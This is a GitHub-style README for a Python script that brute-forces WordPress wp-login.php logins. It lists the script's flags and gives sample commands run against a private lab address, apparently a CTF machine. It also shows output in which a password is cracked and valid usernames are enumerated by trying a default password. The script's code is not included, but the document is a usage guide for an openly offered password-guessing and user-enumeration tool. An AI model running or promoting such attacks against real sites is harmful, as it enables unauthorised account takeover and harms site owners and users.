# python-wp-bruteforce 🔥🚀
python Bruteforce login script for wordpress 👻

* -p = file path to password list file 
* -u =  username / file 
* -t = target address 

**target should should look like this http://site.com/wp-login.php**

# usage 🛸: 
## brute force with valid username 🎃:   
python3 bf.py -t http://192.168.254.107/wp-login.php  -u elliot -p /home/mivatampos/ctf/mr_robot_1/fsocity.txt  

         ____      ____ _________  ____________  ____________                         
         \   \    /   / |_____   | |______     \ |_   ______|  
          \   \/\/   /  |     ___|   |    |   _/  |    ___|         
           \        /   |    |       |    |    \  |    |     
            \__/\__/    |____|       |_________/  |____|    

                      ***********************
                      * By : intrglctcMilk  *  
                      *     -- @tmpts       * 
                      *********************** 


      [+] Attacking [+] ==> tries : 10 

      [+] **** PASSWORD FOUND ***** [+] =====> [ER28-0652] for user elliot
      [-] Time lapsed : 0.4780855178833008 seconds  [-] 
      [-] Number of attempts : 10 [-] 
      
 ## Enumarating users 🔎
( just dont provide the -p flag it will use the default "admin" password to attempt the login : \n 
python3 bf.py -t http://192.168.254.107/wp-login.php  -u usernames.txt 

         ____      ____ _________  ____________  ____________                         
         \   \    /   / |_____   | |______     \ |_   ______|  
          \   \/\/   /  |     ___|   |    |   _/  |    ___|         
           \        /   |    |       |    |    \  |    |     
            \__/\__/    |____|       |_________/  |____|    

                      ***********************
                      * By : intrglctcMilk  *  
                      *     -- @tmpts       * 
                      *********************** 


      [+] Attacking [+] ==> tries : 10 
      *** VALID USERNAME WAS FOUND *** ===> [elliot ] 
      [+] Attacking [+] ==> tries : 26 
      *** VALID USERNAME WAS FOUND *** ===> [john] 
      [+] Attacking [+] ==> tries : 40 
      *** VALID USERNAME WAS FOUND *** ===> [example] 
      [+] Attacking [+] ==> tries : 42 

      [x] *** List of valid usernames *** [x]
      
                 [+] elliot [+]
                 [+] john [+]
                 [+] example [+]





